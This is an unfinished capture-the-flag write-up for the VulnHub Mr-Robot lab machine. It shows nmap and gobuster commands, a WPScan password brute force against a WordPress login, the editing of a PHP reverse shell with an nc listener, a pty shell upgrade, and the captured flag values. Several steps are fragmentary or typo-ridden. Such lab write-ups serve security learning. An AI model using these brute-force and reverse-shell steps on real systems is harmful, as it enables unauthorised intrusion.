# VulnHub Mr.Robot Write - Up
## Overview
- **Machine Name:** [Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/ "Mr-Robot: 1 on Vulnhub")
- **Platform:** VulnHub
- **Difficulty:**  Beginner-Intermediate
- **Date Completed:** August 17, 2025
- **Tools Used:** Kali Linux, nmap, GoBuster, WPScan nano, Python
## Objectives
- Capture all three flags
- Learn and demonstrate exploitation and escalation techniques

---

## Methodology

### 1. Information Gathering
~~~

sudo nmap -sS -T4 10.38.110-120 

~~~
- Identify the ports on the machine to evaluate the type of machine
 - Port 80 (HTTP) open -> Apache web server detected
 - Port 443 (HTTPS) open
 - Port 22 (SSH) open
### 2. Enumeration (Flag 2)
~~~

gobuster dir -u http://10.38.1.111 -w/usr/share/dirbuster/wordlist/directory -list-2.3-small.txt

~~~
- Swept the machines location to find additional dir and files using GoBuster
 - /robots.txt -> contained the extension which led to the first flag as well as a dictionary
 - WordPress login page discovered -> potential attack vector with the dictionary list discovered in robots.txt
~~~

cat fsociety.dic | sort -u> filtered.dic

~~~
- Sorted the dictionary list to remove redundancies and order them alphabetically creating the new filtered.dic

### 3. Exploitation (Flag 2)
~~~

wpscan --url http://10.38.1.111/wp-login/php -U 'elliot' -P filtered.txt

~~~
- Ran the filtered text against the password with the username elliot
~~~

locate php-re

gedit php-reverse-shll.php

~~~
- Locate and edit the contents of a reverse-php-shell which will allow us access into the

~~~

nc -lvnp 443

~~~
- We trigger the script by navigating to a URL that does not exist
 - Within the machine, we were able to locate the /home/robot directory -> We find two files a .raw-md5 and a .txt
 - We crack the hash to find the password for robot
 - Now that we have the password we can login to the Mr.Robot and read .txt
### 4. Privilege Escalation (Flag 3)
-
~~~

python -c 'import pty;pty.spawn("/bin/bash")'

su robot

~~~
- We

### 5. Enumeration (Flag 3)

### 6. Exploitation (Flag 3)
---

## Flags Captured
Flag 1: 073403c8a58a1f80d943455fb30724b9
Flag 2: 822c73956184f694993bede3eb39f959
Flag 3: 04787ddef27c3dee1ee161b21670b4e4
---

## Lessons Learned
Protection against rainbow tables
- Password salting
- Login attempt limit
---

## References
https://www.vulnhub.com/entry/mr-robot-1,151/
